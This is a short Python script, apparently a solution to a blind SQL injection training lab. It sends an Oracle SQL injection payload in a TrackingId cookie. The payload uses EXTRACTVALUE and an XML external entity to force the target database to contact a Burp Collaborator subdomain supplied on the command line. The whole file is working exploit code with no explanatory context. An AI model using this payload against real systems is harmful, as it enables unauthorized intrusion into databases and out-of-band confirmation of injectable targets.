import requests
import sys
import re

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python script.py <url> <burp collabolator subdomain>")
        sys.exit(1)

burp_url = sys.argv[1]
coll_url = sys.argv[2]

burp_cookies = {"TrackingId": "px'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//"+coll_url+"/\">+%25remote%3b]>'),'/l')+FROM+dual--"}
requests.get(burp_url, cookies=burp_cookies)
